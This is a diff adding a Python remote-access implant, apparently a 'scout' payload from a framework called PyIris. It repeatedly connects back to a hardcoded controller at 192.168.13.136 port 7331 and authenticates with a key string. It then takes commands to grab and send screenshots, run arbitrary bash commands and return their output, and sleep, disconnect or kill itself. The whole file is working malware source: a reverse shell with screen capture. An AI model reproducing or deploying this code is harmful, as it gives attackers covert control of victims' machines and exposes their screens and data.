@@ -1,0 +1,99 @@
+#!/usr/bin/python
+import mss.tools
+import socket
+import mss
+from subprocess import Popen, PIPE
+from os import _exit, chdir
+from time import sleep
+
+help_menu = '''
+Scout Help Menu
+===============
+   Base Commands :
+      disconnect               Disconnects the scout
+      help                     Show the help menu or help for specific command, alias of the command is "?"
+      kill                     Kills the scout
+      ping                     Ping the scout
+      sleep                    Make the scout disconnect and sleep for a specified amount of time
+
+   Scout Commands :
+      exec_b <shell command>   A remote shell command execution component of the scout, it allows the scout to remotely execute commands using bash
+      screen                   Takes a screenshot and saves it to in memory file before sending the in memory file to PyIris to download
+'''
+
+def screen():
+    with mss.mss() as sct:
+        monitor = sct.monitors[1]
+        im = sct.grab(monitor)
+        raw_bytes = mss.tools.to_png(im.rgb, im.size)
+        s.sendall(raw_bytes)
+
+def exec_b(execute):
+    execute = execute.split(' ',1)[1]
+    if execute[:3] == 'cd ':
+        execute = execute.replace('cd ', '', 1)
+        chdir(execute)
+        s.sendall("[+]Changed to directory : " + execute)
+    else:
+        result = Popen(execute, executable='/bin/bash', shell=True, stdout=PIPE, stderr=PIPE,
+                       stdin=PIPE)
+        result = result.stdout.read() + result.stderr.read()        
+        s.sendall('[+]Command output : \n' + result)
+
+def recv_all(sock):
+    sock.settimeout(None)
+    data = sock.recv(999999)
+    sock.settimeout(2)
+    while True:
+        try:
+            tmp_data = sock.recv(999999)
+            if not tmp_data:
+                raise socket.error
+            data += tmp_data
+        except (socket.error, socket.timeout):
+            return data
+
+while True:
+    while True:
+        try:
+            s = socket.socket()
+            s.settimeout(5)
+            s.connect(('192.168.13.136',7331))
+            s.sendall('iRy%nbC%cgB1)I@Y$j%p3X$IlPJi1giVpAJhUmJHL1r%St24#U')
+            break
+        except (socket.timeout,socket.error):
+            continue
+    while True:
+        try:
+            data = recv_all(s)
+            command = data.split(' ',1)[0]
+            if command == 'kill':
+                s.sendall('[*]Scout is killing itself...')
+                _exit(1)
+            elif command in ('help','?'):
+                s.sendall(help_menu)
+            elif command == 'ping':
+                s.sendall('[+]Scout is alive')
+            elif command == 'sleep':
+                length = int(data.split(' ',1)[1])
+                s.sendall('[*]Scout is sleeping...')
+                for i in range(length):
+                    sleep(1)
+                break
+            elif command == 'disconnect':
+                s.sendall('[*]Scout is disconnecting itself...')
+                sleep(3)
+                break
+            elif command == "screen":
+                screen()
+            elif command == "exec_b":
+                exec_b(data)
+            else:
+                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)')
+        except (socket.error,socket.timeout):
+            s.close()
+            break
+        except IndexError:
+            s.sendall('[-]Please supply valid arguments for the command you are running')
+        except Exception as e:
+            s.sendall('[!]Error in scout : ' + str(e))
